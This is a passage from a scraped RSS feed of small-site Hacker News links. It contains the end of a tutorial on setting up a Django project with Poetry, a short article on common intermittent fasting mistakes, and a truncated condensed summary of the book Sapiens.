xlink:href='data:image/png%3bbase64%2ciVBORw0KGgoAAAANSUhEUgAAAEAAAAA4CAYAAABNGP5yAAAACXBIWXMAABYlAAAWJQFJUiTwAAAQxUlEQVRo3tVbZ3MjR5LF/ziJJDzaouG9d4QjCHrOcEaanZFZSbtxdxEX9/PfvVdAY0COkchbLakPFeULXVmZLzMrC5G068Gu9lH%2b7mdkr9/Dfvsz7KvvkOxNkX39E1Js8y7uYM/PYLWGcG8%2bwH39I5wPv8K//YDUYIlOZ4ary3dYzG8wnV2g3Z0iX2xhNr/EYLRCodhBLO4hmQqQSGU3eTJryomwLblJm3rA8nYM8934vf5wfnKvbuakNuP/aIqkMgHSfg12f4ZMawxrsoLFj7a6C1idOZLNCTKVPpzmCFZjhAzrdmvCMQtkagMkCi0Uyz3U2V4odVlmKnVgOyXW28jlm3Dc8uYDf%2bdjHvvxn8z/A7/xCQGiURexmIPokY3oYQaH36RwxBQ9yCD6bRqxQxtHh5ZJMY6Ja9yBbfo0Ph5zccAx3zIdRh3mFg41hu3Kj9im0zcp5n0sM%2bmDw3I84SPBFI%2b7SHySNmPVF4/Zm3FMmqffUVLbU4gQqfNUs7kGLLsIP1szJ1iq9MjCbZ5gBx7blJcqXfhBHRm7hCDfNv0ljk1n8qw34flVs0aF4pQjV2isxEAcYDlFkysVOC/g7ymlrTyyHKff9zk/Sa5J5zrI5NpIKc93TZ4MWOfaFn/XqRwj4zXgOPqOBsrVHlOf31Xcbf4xRIgcz84xPl6bDY0mp7i6fodXr3/A%2beVbLE5u0GwfY8m8050hz41Npucc8x7jyRqnZ68NYTTnmLKvD1qtXxkcWK1f4937f6BHjKjWh2be%2beV3mC%2bu0O3NccvfaHHtk9Ut1ud3aFHE3M4paq//B8HJD/CP3yC//hHu8gdkhjewy0OUVj8huPwvpIojzh3z9%2b/47WcGa5armw2mPJYD4lvWSaZyiHHyEdlJKRr3TQpZLb5dOG0VkEznEUuon8CWDnZApXI86ZukeiqTY5//CauHv5lK58w6WjueYF%2ba4/QdCbJ6wiGo5ZgL3LhGajtWYqDxyc1aRgS4boqcmHiKCCSN7HGxuGQ9vZVTLnqUwRHTBnULhhiS58NDh%2b0kUlSyz3J0szERTXOj7BOuHBx55oMTicB8fDKV/QSwHn6sIVRITM0Jy6FGSH2sJ/fmGnzYW%2b9RIuCS3bLT7xDM3yM4%2byeSjRUR/wS59W8ITv%2bOWLaL6vIcw/MuBud9jG8G6Cw7qHYamF6N0F0P0DvpojGuo9iucdwQ44sJFq/m6J/00T6Zw24sdyD1RzRBqBoTe/X7/dl/mSaIWO0TfuAJvPYpsiRCqtCnXTCBP7xk%2bwLJbBXF8RKVXheFRg2NUQeVbguVVgOVDoGtVkOuXEW%2bXkeOqdSsodpuot5vIahUkK13kC50P57Og4%2b81242FtoEwceUemAfPJwX2ghP4YACOcAZcLP9axRWH5ApDFEenGB0PiB4ldEYEvhuVgSehVFzh4dkf7J3lKx/ZNhdqkgioNzf1I82Y2KsSywSoRGUDD7/kfsGUOrTDSb/xBSx6ktYQY%2bnNESqMmLeg12bIF0bwubp%2b7VjeFSVCaodgZyALZXeAJ5ALKynwvqu/LFt94Pp4J41uJP1z5afZtg8mgD%2b6c/Ij9/Aay6QP35NMXiHTH2F7MlvSAdDeN0LWM1Tgpq/O3WdrND5iNxweOCaPCquMJzhGxCMxjZ1jY/Hs2aOuEdriBOMwSPwjdomj9HAibEsQ8f0PYGdn0QAp3uO7OQO3vgGKepau9RHbzUj6zco7zR4GlVUGg10Ji3Uux10pj0UiQW2W0R72sfo4hij0yHHd1EbtNFi3h61UG01CYw9NCc9eLki59QxXA1R7TWManSKA9jEm2zvHJlsC25rBXfAb%2bmcwWE5RXWb2KrTr4He/58Ao1cEuzm8/gViLq25Yhf11QrtOTcy7yFbpcVVqaLap9XVaqE7H6DUqsHNVdCaddFfj1Efd9AY9NAiceqDFgnR5IarJIraushVyiRkjVphgBqJaslqLNJ6y7bh0fjJ0NpzO2u4BGJ/fIcMy0np9R0O/IkEsKrHBgSd8WsEFAWrMoRFEUg0zmnLuwbcjHG01f2G3aNia4/s7%2bDgW9kPG9vgkD6CROKQrG/mHjlmfExGVWwz3ogQfzi2FQHD9gkB6FYE4hu7/r4I/MkEcFsncKgK3fY5rNIQTp32dnVovMQUbf%2bUV0GStnbaKm7AT2W2p7e56rIOba8MN1ugf5AjsGpO6d6PheD5%2bRPN/Uu8u0cTIH/5TxSv/xeF6/%2bEPbhG8eRH5Fbv6fLSLuhdI3/6I4pnvyF//d90kS8RNOfIn/%2bC7PErBLM3KK1/gXfyAcnyCIXBGuMV1We7iuZsCZd2hE45ec%2b4yX607lJfSw8NoY%2bcsD9mf50vGUpfI2REHlgq20TCqyKRKVCtlc2JpqwyT7KAjN9AnG0Jp4qY%2bsUFdpltJSRMmV4Y6yZ5XIf2fNLykXYqbKts/ASjCh%2bmL6nB3GfKv5dyT74riMQOk/Tz6dcfWRu1xDwe3ZZj9OXpHyTiDhLyw1nftakc3Y6Vg6J58h3kPFGWzZocY%2boqb8eaZPps07/5Ld9gilRiPFSFYW7GbMoJs563cYii276wX22JUFV7BndU153E53yOHQGyix8QtKmCqO8zAf1/snmmueTJ14kJa/ijW6SJ2F59DqtGu74yhrf4Hm5/Da%2b3hl2fmXkOLUmHayRzXYrOJbKDG9oTM1gFqtLpHbL9G4654nobsHU7tDWIPX7/kvYGtQHN72B4S4v0kt/A3%2b0w55o2f9ftXMCnarQ5PkPV6dSmHCN1OYdPzeFRVNPlCYqVHmo9%2biljaqxm39w/DEY09Z3iPVM5NM5UjzjHb%2bFzMa/JzeR7yMv3JgFSFAlH6nFwRTO4xzREpnJMLdGHRY1hU1vY/HGrOoVTHVOTkAAkWIys75MADj/aKo2QyreRIxH90R3SVG8%2biZAdvyJxFnBKx4bgcYphJmjQ4OJa%2bn0Rmu3SRjZ/023z%2b0iQZG1GsSoaovkklojg0mqVKk9XJqgUG5gseqgeN1BvdZDjmtP5BUW5aDxXbVy2hbgidMkjzvpXfjA/tn9L6nYQTG65ERonXt3o5tz0LTc%2bIYGWxkv0qDXyp78gr4/gxlw6Uy6J4U/oUZIImaAJ7/iO9TcEybc0bq5hzT/Qu/yV9b8RSNdIuyXkzn6BT9/D4zh/%2bcGArac1uV7AtRLEJVsnzf4s13NJGG8sQl7TWFpz03fGdvF6Z7CDOrlvjeLyJ/iDO3LKBYKTn8k9KwQkwvH6BL3zHg20MYqlrrng0Q2WiBDR5m2eRpopQ%2bss6F7x5E/JATWD4i61QSLQ9RQTVaSV7/L0TmB5DRJmjDS5xqO35zY34pCkBWfTf7ArU2TKx4ZzbP5Ghqa2VaUYcWyG3OXJ8iMHOZUZ1e6Mc2ZGvOzSgH7IFAmCb5oWok0ustgnL9Vjni4MjBikSxzLw5BBlbTyXIPr06%2bxq1xH13CNKZL8tiBXR6s/RFAro1BpwXErdPIG5vrOEKBAFVdcbq6gsot39Ah/Rm5Bt5jEKE5eITu8Qrq5MkBmLid3F5MbkDR1Y9Nbm3ZdTmzBKRH2h%2bCn/q2hEwKeGWMAbgtq6t%2buH/5GOG8334xxdr8f/ma4jvnO6HbOFhhjUX93I6WLnRAPIimCneXWqLak/ph4skmaxOb6S54e26X27iNp7pGq6EvqL/enGzq/pxojRwSEQ6qwqLm%2bdndX4OF1c%2bwLV877V1Sf07H3ghgPLy0eXm99YuDszwvuBU9Co%2biLv5%2b8f7P08Xs%2b/TaNjfQHS3NLqxtaXW/r9rfXX6DVmaJWp5fXHO/URuoLJ7bv8z/1Zua5UqS93bA2W60NzBWzrsm1cYW41GaCHJSxA3JJyBWxLYdIng62HBPfu/f7K2zeEEB3%2b8vV7SY4QXWikJbu2kfjU0yYr8/uNlwxPMH89BYLpv54hWpzZOJ%2bi%2bU1Lq%2b/x9n5GxMr0NjEX2DjOwJ0yP5tsrsiNYrS6H5d0SFxxYCbVpCjzs32We4MFqYvX%2bqgWOubsiJL2nSjNTZRH8UB408MUz0LAaZkeUVvtOGzi7cmLCYsUHBjcXJtREAhMEVefBLpQFbUNsgRikAYA9wXg/3LjK9dhD63yEQEfsVyBxWeaI2nqTigYnsKg7m0lmQxqaz%2b2J4t/bX0R3744bhnI8CasitZrxP0lM8WV4alFRtUeFsBU0V4FBKLyojYAmB48mHI69Co0w0nhNywn8L2MNQWRpD3Q2Wfixb96QSokMXF/s3WxMizgNDxKiaXKjyenlO%2bJ0YreBSBKvNwrAgluReRtIYCnwJPjZVW6WzVq8RIuZI4SiIlL03tWlsAHD6g%2bLdzgNSeAE7R3U5vZh43CBDLCpGT9QWE2pj6/XwDJYqCNqLNzakBFJqW2ykHQ9pE46VFpBFkXygpwizVqgixNi/CSbto86G4PRsBxIoCtm8OMibyE91/sKBo8ZbVDSsTGGULaJyZI6txy%2bIH24cROxGI338MEYpByPIvRgQk24qsGu/IhKn9rR%2bwuZYWWGXMHX3WgGB8C2AJE/7ehMkt%2bfMKmz/ih18MCErVrU5fYUijRlpA4Hd59T30cEJtetxwffseN0ynF29Mun39wahF9Z9wrowhL1u9Zwk%2b9l3PsxFAYCU5lY8sVSd5FgboqYtkVQAleRc2ZGjk2H7FAJmAUkaPAUyCYOqJgYx7vsNzEEBPVGaLSxpBbzbPYIjq2mA2VzdqUYQQF4jVY1t53U/7D55eAks/mgCSXePgPNhEuLnweYuR%2bT0j6KFB9Ffc/OZafIvQ4YZDFH%2bI4CGRwv79tN%2b3L9PPgeqPJoB0vABNBowME4nE6fq1cYKEDRIBgaL0u0BSL8IEmnpBJl0u/0Fzjb2wpCFE/Z/ew4MXzwECPm1cxoj8gFpjaGReDpGMHOVqEwgKF2QFyhAqb7FBFmF%2ba8xoHdU3189/EQLoZWdoxBijiOVvH9TDC48viUAoKmH5uYyap3HA1pTNFZrmFKXSdC8Qnqr6Vf%2baF/i1ONyLxwDJ8JAyrEsRqT3Z7ZJt2f4ycq5v/mYcnv/4JmUePIWgF3qC%2byrxa5t9qYSIyOPTe1tdhAgP5BYbj5BGjuReMi/iyEYI7w3l0MgKNDYC6%2bZGiPMEfi/R2vsqAcybX6K%2bCCFwE6K7WysvFAF5jOaegFrBaAMSQveBykUg8wi61Kah9PFFeOj8vPQb4ojUVm%2bwoBisjDuszeoOILTxVdbNkE5XpyxVJ2KIA7R5mdAaqzapULm8aperq8tSlUXQp/gJ/xYCSG3JJxdbS9ZVl4rT6eqyRGLgBzXj8clHCC87jNpjLvDUHCW1a7xESmtJNPb/LPEiRSBUXftqLmTffQswBLrPWYqfU4mxPf//YSTpJREjkgzVWPiMJb1JqfTH8i6GZ9rz9/t2Y4JP2j9RkemXpx0i4UvN8KlLWN49fTH59imKeUqT2UZ2LSRj2/6YY970x8Pxe09bzHqJzTM5PV3RC9P49pGCOOS5jaaI3VybxxBea21i/ZZebTaW8PQIQfF7llOlEdzSAG73HFb7DG59YV52ZqrH8BsL2K0lEpznVcfmyZ1VnXHMEj7HWvm%2buV%2bsdjqodPRyo29wwVyWEjOenQOc0Rs45TGKJ3%2bHzQ%2b2yyNk5x/MUxa9sNA7HT1QKM%2b/R6B3BJPvke%2bcIze5M2%2bC8rN3cFqnSLl1BMMr5OasD27N253C9DtkKlMDpuPVDIPlEJ2BALRtLlEVmH3uMNr/AR/0odlbH5ttAAAAAElFTkSuQmCC' /%3e%3c/svg%3e" data-src="/assets/static/poetry_init.cd61fdf.02d3f24e444ee33cc2ed0480e0f26c9f.png" data-srcset="/assets/static/poetry_init.82a2fbd.02d3f24e444ee33cc2ed0480e0f26c9f.png 480w, /assets/static/poetry_init.cd61fdf.02d3f24e444ee33cc2ed0480e0f26c9f.png 1168w"></p><h2 id="4-add-the-necessary-dependencies">4. Add the Necessary Dependencies</h2><p>Run <code>poetry add django</code>. Poetry will add <code>django</code> to the <code>pyproject.toml</code> file under the dependencies section. A virtual environment will also be created for you. </p><h2 id="5-start-you-django-project">5. Start you Django Project</h2><pre><code>django-admin startproject django_poetry_example .</code></pre><h2 id="6-working-on-your-django-project">6. Working on your Django Project</h2><p>When you need to run any python function (for example, <code>python manage.py createsuperuser</code>) you have two options.</p><ol><li>You can leverage <code>poetry run</code>, which will run against the current project's dependencies. The command will be this: <code>poetry run python manage.py createsuperuser</code>.</li><li>You can activate the virtual environment with a <code>poetry shell</code> command. Now you can run python commands, as is. They will be run with dependencies you have installed.</li></ol><h2 id="bonus-export-dependencies-to-a-requirementstxt">Bonus. Export dependencies to a requirements.txt</h2><p>If you need to have the <code>requirements.txt</code> file with all the dependencies, you can run <code>poetry export -f requirements.txt --output requirements.txt</code>. If you have configured a CI/CD job that auto deploys your project, you can add this function as a step, which will generate the updated version on each update.</p><h2 id="bonus-ii-video">Bonus II. Video</h2><p>If you prefer a more visual approach, I have made a video that shows how to start a Django project with Poetry.</p><div><div><p><iframe src="https://www.youtube-nocookie.com/embed/-c8DASfFNZM" allow="autoplay; encrypted-media" allowfullscreen="allowfullscreen"></iframe></p></div></div><p>If you have any feedback, please let me know on <a href="https://twitter.com/rasulkireev/status/1322499651732385792" target="_blank" rel="nofollow noopener noreferrer">Twitter</a>. Your likes, retweets, and replies will show up here.</p></div></div>]]>
            </description>
            <link>https://rasulkireev.com/managing-django-with-poetry/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950553</guid>
            <pubDate>Sat, 31 Oct 2020 11:24:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Common Mistakes When Practicing Intermittent Fasting]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950533">thread link</a>) | @azimey
<br/>
October 31, 2020 | https://www.sourceht.com/3-common-mistakes-when-practicing-intermittent-fasting/ | <a href="https://web.archive.org/web/*/https://www.sourceht.com/3-common-mistakes-when-practicing-intermittent-fasting/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-td-block-uid="tdi_76_7a2">

<div><p><span>Every day more and more people adopt <a href="https://www.sourceht.com/intermittent-fasting-what-you-should-know/">intermittent fasting</a> as a weight loss protocol.</span></p>
<p><strong><span>Unfortunately, it is not so easy to get rid of old eating habits, which makes us fall into these 3 most common mistakes when practicing intermittent fasting.</span></strong></p>
<h2><strong>1. Starting By Making Very Drastic Changes</strong></h2>
<p>When you decide to incorporate intermittent fasting into your lifestyle, the most important thing is to do it progressively.</p>
<p>Start by avoiding food for 12 hours. Once you have gotten used to it and it is no longer so difficult, add 2 more hours to your fasting window.</p>
<p>The true benefits of intermittent fasting are achieved after the first 16 to 18 hours of fasting. For this reason, the most popular protocol is 16: 8, in which you have 16 hours of fasting followed by 8 hours where food is allowed.</p>
<h2><strong>2. Overeating</strong></h2>
<p>At the start, when your body is not used to intermittent fasting, it will be “asking” you for food. For this reason, it is easy for you to overdo it when it is time for lunch.</p>
<p>One way to avoid this is to take your mealtime slowly, sit still, eat slowly, and enjoy your food without distractions.</p>
<h2><strong>3. Drinking the Wrong Liquids</strong></h2>
<p>Many people think that drinking any type of liquid will not interfere with fasting. This is very far from reality. When fasting, you have to avoid consuming calories completely.</p>
<p>For this reason, during fasting, people drink only water, coffee, or black tea <strong>without milk, cream, or sugar.</strong></p>
<p>Adding any of these extra ingredients breaks the fast, and in the end, are extra calories that you are probably not counting at the end of the day.</p>
<p>Any type of fruit juice contains enough calories to break your fast, especially if they are of the processed ones that you regularly find in the supermarket. Avoid these simple mistakes for the best results from your intermittent fasting program.</p>
</div></div></div>]]>
            </description>
            <link>https://www.sourceht.com/3-common-mistakes-when-practicing-intermittent-fasting/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24950533</guid>
            <pubDate>Sat, 31 Oct 2020 11:21:40 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[If Sapiens were a blog post]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24950132">thread link</a>) | @neilkakkar
<br/>
October 31, 2020 | https://neilkakkar.com/sapiens.html | <a href="https://web.archive.org/web/*/https://neilkakkar.com/sapiens.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">
    <map name="image-map">
    <area alt="Taming fire" title="Development of Brains" href="#development-of-brains" coords="0,77,115,77,80,150,0,150" shape="poly">
    <area alt="cognitive revolution" title="Cognitive Revolution" href="#cognitive-revolution" coords="115,77,230,77,195,150,80,150" shape="poly">
    <area alt="agriculture revolution" title="Agricultural Revolution" href="#agricultural-revolution" coords="230,77,345,77,310,150,195,150" shape="poly">
    <area alt="unificiation" title="Unification of Humanity" href="#unification-of-humankind" coords="345,77,460,77,415,150,310,150" shape="poly">
    <area alt="scientific revolution" title="Scientific Revolution" href="#scientific-revolution" coords="460,77,575,77,520,150,415,150" shape="poly">
    <area alt="industrial revolution" title="Industrial Revolution" href="#industrial-revolution" coords="575,77,690,77,635,150,540,150" shape="poly">
    <area alt="present" title="The Present" href="#the-end-of-homo-sapiens" coords="690,77,805,77,750,150,655,150" shape="poly">
</map>

<figure>
    
        <a target="_blank" href="https://amzn.to/2WWNsjq" rel="noopener">
    
    <img src="https://neilkakkar.com/assets/images/sapiens.jpg" alt="">
    
        </a>
    
    
    
</figure>

<p>I spent over 25 hours building a cut-down version of Sapiens. The goal? Future-me should be happy to read this once future-me forgets how we evolved. It’s massive for a blog post, just under 30 minutes, but that’s the best I could do, condensing 9 hours worth of material.</p>

<p>I’ve tried to keep editing to a minimum: It’s the original text, edited to ensure it still flows like the book.</p>

<p>You can get the book <a href="https://amzn.to/2WWNsjq" target="_blank" rel="noopener">here</a><sup id="fnref:2"><a href="#fn:2">1</a></sup></p>

<!-- 1: An Animal of No Significance -->

<p>The best way of navigating is clicking on the images. These are best experienced on a tablet or a laptop. I’ve also included the table of contents, which work well on every screen size.</p>





<nav>

  <h4>Table of Contents</h4>

<ul id="markdown-toc">
  <li><a href="#development-of-brains" id="markdown-toc-development-of-brains">Development of brains</a></li>
  <li><a href="#cognitive-revolution" id="markdown-toc-cognitive-revolution">Cognitive Revolution</a></li>
  <li>
<a href="#agricultural-revolution" id="markdown-toc-agricultural-revolution">Agricultural Revolution</a>    <ul>
      <li>
<a href="#imagined-realities---solving-the-co-ordination-problem" id="markdown-toc-imagined-realities---solving-the-co-ordination-problem">Imagined Realities - Solving the co-ordination problem</a>        <ul>
          <li><a href="#the-imagined-order-is-embedded-in-the-material-world" id="markdown-toc-the-imagined-order-is-embedded-in-the-material-world"><strong>The imagined order is embedded in the material world.</strong></a></li>
          <li><a href="#the-imagined-order-shapes-our-desires" id="markdown-toc-the-imagined-order-shapes-our-desires"><strong>The imagined order shapes our desires.</strong></a></li>
          <li><a href="#the-imagined-order-is-inter-subjective" id="markdown-toc-the-imagined-order-is-inter-subjective"><strong>The imagined order is inter-subjective.</strong></a></li>
        </ul>
      </li>
      <li><a href="#preserving-the-imagined-reality" id="markdown-toc-preserving-the-imagined-reality">Preserving the imagined reality</a></li>
      <li><a href="#more-individual-suffering" id="markdown-toc-more-individual-suffering">More individual suffering</a></li>
    </ul>
  </li>
  <li>
<a href="#unification-of-humankind" id="markdown-toc-unification-of-humankind">Unification of Humankind</a>    <ul>
      <li>
<a href="#money" id="markdown-toc-money">Money</a>        <ul>
          <li><a href="#how-money-works" id="markdown-toc-how-money-works">How Money Works</a></li>
          <li><a href="#proliferation-of-gold" id="markdown-toc-proliferation-of-gold">Proliferation of gold</a></li>
        </ul>
      </li>
      <li>
<a href="#empires" id="markdown-toc-empires">Empires</a>        <ul>
          <li><a href="#the-imperial-cycle" id="markdown-toc-the-imperial-cycle">The Imperial Cycle</a></li>
        </ul>
      </li>
      <li>
<a href="#religion" id="markdown-toc-religion">Religion</a>        <ul>
          <li><a href="#battle-between-good-and-evil-for-monotheism" id="markdown-toc-battle-between-good-and-evil-for-monotheism">Battle between good and evil for monotheism</a></li>
          <li><a href="#towards-principles-other-than-god" id="markdown-toc-towards-principles-other-than-god">Towards principles other than god</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li>
<a href="#scientific-revolution" id="markdown-toc-scientific-revolution">Scientific Revolution</a>    <ul>
      <li><a href="#imperialism-and-science" id="markdown-toc-imperialism-and-science">Imperialism and science</a></li>
      <li><a href="#capitalism-and-science" id="markdown-toc-capitalism-and-science">Capitalism and science</a></li>
    </ul>
  </li>
  <li>
<a href="#industrial-revolution" id="markdown-toc-industrial-revolution">Industrial Revolution</a>    <ul>
      <li>
<a href="#aftereffects-of-industry" id="markdown-toc-aftereffects-of-industry">Aftereffects of Industry</a>        <ul>
          <li><a href="#collapse-of-family" id="markdown-toc-collapse-of-family">Collapse of family</a></li>
          <li><a href="#movement-from-war-to-peace" id="markdown-toc-movement-from-war-to-peace">Movement from war to peace</a></li>
        </ul>
      </li>
    </ul>
  </li>
  <li><a href="#the-end-of-homo-sapiens" id="markdown-toc-the-end-of-homo-sapiens">The End of Homo Sapiens</a></li>
</ul>

</nav>

<!-- works only once jQuery is loaded -->


<h2 id="development-of-brains">Development of brains</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/sapiens-timeline-1.jpg" alt="" usemap="#image-map">
    
    
    
</figure>

<p>What caused our brains to develop? We’re not sure.</p>

<p>It doesn’t seem likely. A larger brain needs more energy and thus reduces the chance you’ll survive. Getting more energy meant hunting more.</p>

<p>One contributing factor was the domestication of fire. Fire paved the way for cooking.</p>

<p>Whereas chimpanzees spend 5 hours a day chewing raw food, a single hour suffices for people eating cooked food. The advent of cooking enabled humans to eat more kinds of food, to devote less time to eating, and to make do with smaller teeth and shorter intestines. Some scholars believe there is a direct link between the advent of cooking, the shortening of the human intestinal track, and the growth of the human brain. Since long intestines and large brains are both massive energy consumers, it’s hard to have both. By shortening the intestines and decreasing their energy consumption, cooking inadvertently opened the way to the jumbo brains.</p>

<p>And, we weren’t alone. Competing with us were the Neanderthals, among other species. They were stronger, they had bigger brains, and they could survive the cold. How come, then, did we “win”?</p>

<p>We aren’t sure. The most likely answer is the very thing that makes the debate possible: Homo sapiens conquered the world thanks above all to its unique language.</p>

<h2 id="cognitive-revolution">Cognitive Revolution</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/sapiens-timeline-2.jpg" alt="" usemap="#image-map">
    
    
    
</figure>

<p>The appearance of new ways of thinking and communicating, between 70,000 and 30,000 years ago, constitutes the Cognitive Revolution. What caused it? We’re not sure. The most commonly believed theory argues that accidental genetic mutations changed the inner wiring of the brains of Sapiens, enabling them to think in unprecedented ways and to communicate using a new type of language. We might call it the Tree of Knowledge mutation.</p>

<!-- 
> All new humans are improvements over the past?
> As in, the de facto keeps rising.

>These mutated humans were praised for their initiative and were more successful
>Till everyone became like this and then even more better humans were praised and the previous became the normal -->

<p>What’s special about our language?</p>

<p>Our language is amazingly supple. We can connect a limited number of sounds and signs to produce an infinite number of sentences, each with a distinct meaning. We can thereby ingest, store and communicate a prodigious amount of information about the surrounding world. A monkey can yell to its comrades, ‘Careful! A lion!’ But a modern human can tell her friends that this morning, near the bend in the river, she saw a lion tracking a herd of bison. She can then describe the exact location, including the different paths leading to the area. With this information, the members of her band can put their heads together and discuss whether they ought to approach the river in order to chase away the lion and hunt the bison.</p>

<!-- Most likely, both the gossip theory (who can be trusted and who can't) and the there-is-a-lion-near-the-river theory are valid.  -->

<p>Yet the truly unique feature of our language is not its ability to transmit information about men and lions. Rather, it’s the ability to transmit information about things that do not exist at all. As far as we know, only Sapiens can talk about entire kinds of entities that they have never seen, touched or smelled.</p>

<!-- The alpha male usually wins his position not because he is physically stronger, but because he leads a large and stable coalition -->

<p>Using language, lots of humans could work together, form a tribe, help each other, and hunt together.</p>

<p>However, communicating with lots of people brings with it new co-ordination problems. The critical threshold for a group interacting together is 150 people.</p>

<!-- But once the threshold of 150 individuals is crossed, things can no longer work that way. You cannot run a division with thousands of soldiers the same way you run a platoon. Successful family businesses usually face a crisis when they grow larger and hire more personnel. If they cannot reinvent themselves, they go bust.  -->

<p>How did Homo sapiens manage to cross this critical threshold, eventually founding cities comprising tens of thousands of inhabitants and empires ruling hundreds of millions? The secret was probably the appearance of fiction. Large numbers of strangers can cooperate successfully by believing in common myths. This is an imagined reality.</p>

<!-- Ever since the Cognitive Revolution, Sapiens has thus been living in a dual reality. On the one hand, the objective reality of rivers, trees and lions; and on the other hand, the imagined reality of gods, nations and corporations.  -->

<!-- As time went by, the imagined reality became ever more powerful, so that today the very survival of rivers, trees and lions depends on the grace of imagined entities such as gods, nations and corporations. -->

<p>Unlike lying, an imagined reality is something that everyone believes in, and as long as this communal belief persists, the imagined reality exerts force in the world.</p>

<p>In other words, while the behaviour patterns of archaic humans remained fixed for tens of thousands of years, Sapiens could transform their social structures, the nature of their interpersonal relations, their economic activities and a host of other behaviours within a decade or two.</p>

<!-- > Because of the cognitive Revolution and the introduction of imagined reality -->

<p>For example, consider trade. Trade cannot exist without trust, and it is very difficult to trust strangers. The global trade network of today is based on our trust in such fictional entities as the dollar, the Federal Reserve Bank, and the totemic trademarks of corporations. When two strangers in a tribal society want to trade, they will often establish trust by appealing to a common god, mythical ancestor or totem animal.</p>

<!-- One on one, even ten on ten, we are embarrassingly similar to chimpanzees. Significant differences begin to appear only when we cross the threshold of 150 individuals, and when we reach 1,000–2,000 individuals, the differences are astounding -->

<!-- The real difference between us and chimpanzees is the mythical glue that binds together large numbers of individuals, families and groups. This glue has made us the masters of creation. -->

<p>Our Tree of Knowledge mutation was significant. However, it’s not just our biology that brought us where we are today.</p>

<ol>
  <li>
    <p>Biology sets the basic parameters for the behaviour and capacities of Homo sapiens. The whole of history takes place within the bounds of this biological arena.</p>
  </li>
  <li>
    <p>This arena is extraordinarily large, allowing Sapiens to play an astounding variety of games. Thanks to their ability to invent fiction, Sapiens create more and more complex games, which each generation develops and elaborates even further</p>
  </li>
  <li>
    <p>Consequently, in order to understand how Sapiens behave, we must describe the historical evolution of their actions.</p>
  </li>
</ol>

<!-- Referring only to our biological constraints would be like a radio sports-caster who, attending the World Cup football championships, offers his listeners a detailed description of the playing field rather than an account of what the players are doing. -->

<!-- There is some evidence that the size of the average Sapiens brain has actually decreased since the age of foraging. Survival in that era required superb mental abilities from everyone. When agriculture and industry came along people could increasingly rely on the skills of others for survival, and new ‘niches for imbeciles’ were opened up. You could survive and pass your unremarkable genes to the next generation by working as a water carrier or an assembly-line worker. -->

<h2 id="agricultural-revolution">Agricultural Revolution</h2>

<figure>
    
    <img src="https://neilkakkar.com/assets/images/sapiens-timeline-3.jpg" alt="" usemap="#image-map">
    
    
    
</figure>

<p>The currency of evolution is neither hunger nor pain, but rather copies of DNA helixes. Just as the economic success of a company is measured only by the number of dollars in its bank account, not by the happiness of its employees, so the evolutionary success of a species is measured by the number of copies of its DNA. If no more DNA copies remain, the species is extinct, just as a company without money is bankrupt. If a species boasts many DNA copies, it is a success, and the species flourishes. From such a perspective, 1,000 copies are always better than a hundred copies. This is the essence of the Agricultural Revolution: the ability to keep more people alive under worse conditions.</p>

<p>Rather than heralding a new era of easy living, the Agricultural Revolution left farmers with lives generally more difficult and less satisfying than those of foragers. Hunter-gatherers spent their time in more stimulating and varied ways, and were less in danger of starvation and disease. The Agricultural Revolution certainly enlarged the sum total of food at the disposal of humankind, but the extra food did not translate into a better diet or more leisure. Rather, it translated into population explosions and pampered elites. The average farmer worked harder than the average forager, and got a worse diet in return. The Agricultural Revolution was history’s biggest fraud.</p>

<!-- > The average person in Jericho of 8500 BC lived a harder life than the average person in Jericho of 9500 BC or 13,000 BC. But nobody realised what was happening. Every generation continued to live like the previous generation, making only small improvements here and there in the way things were done. Paradoxically, a series of ‘improvements’, each of which was meant to make life easier, added up to a millstone around the necks of these farmers -->
<!-- 
--- Way of life being lost over generations
    Like with the foundation.
    Also short sightedness.
    As, working harder here meant more food => can better feed children => even more people exist => You're back where you started, except you're working harder.
 -->

<p>Compared to foraging, working a bit harder on the farm meant more food. Settling down on the farm also meant greater freedom to reproduce - you’re not travelling all the time, so you can afford to have more children. This in turn, meant a higher population. And a higher population meant higher food requirements. Thus, the farmers were forced to work even harder.</p>

<p>Why didn’t humans abandon farming when the plan backfired? Partly because it took generations for the small changes to accumulate and transform society and, by then, nobody remembered that they had ever lived differently. And partly because population growth burned humanity’s boats. If the adoption of ploughing increased a village’s population from a hundred to 110, which ten people would have volunteered to starve so that the others could go back to the good old times? There was no going back. The trap snapped shut.</p>

<blockquote>
  <p>One of history’s few iron laws is that luxuries tend to become necessities and spawn new obligations</p>
</blockquote>

<p>This discrepancy between evolutionary success and individual suffering is perhaps the most important lesson we can draw from the Agricultural Revolution. When we study the narrative of plants such as wheat and maize, maybe the purely evolutionary perspective makes sense. Yet in the case of animals such as cattle, sheep and Sapiens, each with a complex world of sensations and emotions, we have to consider how evolutionary success translates into individual experience.</p>

<!-- In the following chapters we will see time and again how a dramatic increase in the collective power and ostensible success of our species went hand in hand with much individual suffering. -->

<!-- How the agricultural revolution led to individual suffering -> -->

<!-- 6: Building Pyramids -->

<!-- This was a far-reaching revolution, whose impact was psychological as much as architectural. Henceforth, attachment to ‘my house’ and separation from the neighbours became the psychological hallmark of a much more self-centered creature. -->

<h3 id="imagined-realities---solving-the-co-ordination-problem">Imagined Realities - Solving the co-ordination problem</h3>

<p>According to the science of biology, people were not ‘created’. They have evolved. And they certainly did not evolve to be ‘equal’. The idea of equality is inextricably intertwined with the idea of creation.</p>

<p>A natural order is a stable order. There is no chance that gravity will cease to function tomorrow, even if people stop believing in it. In contrast, an imagined order is always in danger of collapse, because it depends upon myths, and …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://neilkakkar.com/sapiens.html">https://neilkakkar.com/sapiens.html</a></em></p>]]>
            </description>
            <link>https://neilkakkar.com/sapiens.html</link>
